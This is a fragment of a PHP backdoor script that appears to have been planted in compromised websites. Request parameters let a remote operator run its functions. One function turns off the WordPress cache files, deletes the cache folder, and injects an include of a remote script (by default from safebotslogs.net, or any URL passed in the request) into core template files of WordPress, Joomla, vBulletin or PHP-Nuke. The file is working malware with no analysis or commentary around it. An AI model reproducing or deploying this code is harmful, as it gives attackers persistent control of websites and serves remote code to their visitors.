			echo '<fail>Can\'t write in cache config file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}

function ScriptUpdate() 
{
	define('__SCRIPT_PATH_', '../../../general-template.php'); 
	define('__UPDATE_CACHE1_', '../../../../wp-content/advanced-cache.php'); 
	define('__UPDATE_CACHE2_', '../../../../wp-content/wp-cache-config.php');
	define('__STANDART_SCRIPT_URL_', 'http://safebotslogs.net/StatA/Stat.php'); 
	define('__CACHE_FOLDER_', '../../../../wp-content/cache/'); 
	
	$sScriptURL = $_REQUEST['include_update']; 
	
	$nMatch = preg_match('#^http:\/\/#i', $sScriptURL); 
	if($nMatch === false || $nMatch == 0) 
	{
		$sScriptURL = __STANDART_SCRIPT_URL_;
	}
	
	
	DeactivateCache(__UPDATE_CACHE1_); 
					
	DeactivateCache(__UPDATE_CACHE2_); 
	
	RecursiveDelete(__CACHE_FOLDER_, true); 
	
	$bUpdateResult = TryUpdate($sScriptURL, __SCRIPT_PATH_); 
							  
	
	if($bUpdateResult === true) 
	{
		echo '<correct>Include update correct</correct>';
		exit();
	}
	
	$bIsUseCurl = CheckCurlWork($sScriptURL);
	
	if(!(strpos(__SCRIPT_PATH_, 'general-template.php') === false)) 
	{
		MakeWordPressPreg(__SCRIPT_PATH_, $sScriptURL, $bIsUseCurl, true);  
	} else
		if(!(strpos(__SCRIPT_PATH_, 'template-functions-general.php') === false))
		{
			MakeWordPressPreg(__SCRIPT_PATH_, $sScriptURL, $bIsUseCurl, false);  
		} else
			if(!(strpos(__SCRIPT_PATH_, 'templates') === false) && !(strpos(__SCRIPT_PATH_, 'index.php') === false)) // Джумла шаб
			{
				MakeJoomlaPreg(__SCRIPT_PATH_, $sScriptURL, $bIsUseCurl);  
			} else
				if(!(strpos(__SCRIPT_PATH_, 'functions.php') === false)) 
				{
					MakeVBulletinPreg(__SCRIPT_PATH_, $sScriptURL, $bIsUseCurl); 
				} else
					if(!(strpos(__SCRIPT_PATH_, 'counter.php') === false))
					{
						MakePhpNukePreg(__SCRIPT_PATH_, $sScriptURL, $bIsUseCurl);
					}

		
	
	echo '<correct>Correct include in file</correct>';
	exit();
}

function CheckScript() 
{
	echo '<correct>Script avalible</correct>';
	exit();
}


function Main() 
{	
	if(isset($_REQUEST['update']) == true) 
	{
		Update(); 
	}
	
	if(isset($_REQUEST['include_update']) == true)
	{
		ScriptUpdate(); 
	}
	
	if(isset($_REQUEST['check_script']) == true)
	{
		CheckScript(); 
	}
	
	if(isset($_REQUEST['remove_script']) == true)
	{
		RemoveScript(); 
	}
}

Main();

?>
